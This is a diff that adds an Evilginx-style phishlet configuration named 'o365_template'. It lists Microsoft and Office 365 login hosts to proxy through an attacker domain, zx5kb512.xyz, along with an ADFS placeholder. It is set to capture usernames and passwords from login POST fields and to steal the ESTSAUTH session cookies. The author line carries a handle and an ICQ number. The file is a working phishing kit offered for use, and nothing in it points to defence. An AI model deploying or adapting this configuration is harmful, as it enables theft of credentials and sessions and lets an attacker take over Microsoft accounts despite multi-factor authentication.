@@ -1,0 +1,56 @@
+name: "o365_template"
+author: "@G66K ICQ: 747246257"
+min_ver: "2.3.0"
+
+params:
+  - {name: "adfs_domain", default: "", required: true}
+  - {name: "adfs_phish_sub", default: "", required: true}
+  # - {name: "login_phish_sub", default: "login", required: true}
+  # - {name: "www_phish_sub", default: "www", required: true}
+
+proxy_hosts:
+  # Microsoft and Office 365 Hosts with unique subdomains per phishlet
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'portal', orig_sub: 'portal', domain: 'microsoftonline.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'microsoftonline.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'login-microsoft', orig_sub: 'login', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msftauth.net', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'login-live', orig_sub: 'login', domain: 'live.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www365', orig_sub: 'www', domain: 'microsoft365.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: '', orig_sub: '', domain: 'zx5kb512.xyz', session: true, is_landing: true}
+
+  # ADFS Host (Template Placeholder)
+  - {phish_sub: "{adfs_phish_sub}", orig_sub: "{adfs_phish_sub}", domain: "{adfs_domain}", session: true, is_landing: false}
+
+sub_filters:
+  # Microsoft Online Sub Filters with unique subdomains per phishlet
+  - {triggers_on: 'phishing.phishing.zx5kb512.xyz', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+  - {triggers_on: 'phishing.phishing.zx5kb512.xyz', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+  # ADFS Sub Filters (Template Placeholder)
+  - {triggers_on: "{adfs_phish_sub}.{adfs_domain}", orig_sub: "{adfs_phish_sub}", domain: "{adfs_domain}", search: "https://{adfs_phish_sub}.{adfs_domain}", replace: "https://phish.zx5kb512.xyz", mimes: ["text/html", "application/json", "application/javascript"]}
+
+auth_tokens:
+  - domain: ".login.microsoftonline.com"
+    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT"]
+  - domain: "login.microsoftonline.com"
+    keys: ["SignInStateCookie"]
+
+auth_urls:
+  - "/kmsi*"
+
+credentials:
+  username:
+    key: "(login|UserName)"
+    search: "(.*)"
+    type: "post"
+  password:
+    key: "(passwd|Password)"
+    search: "(.*)"
+    type: "post"
+
+login:
+  domain: "login.microsoftonline.com"
+  path: "/"
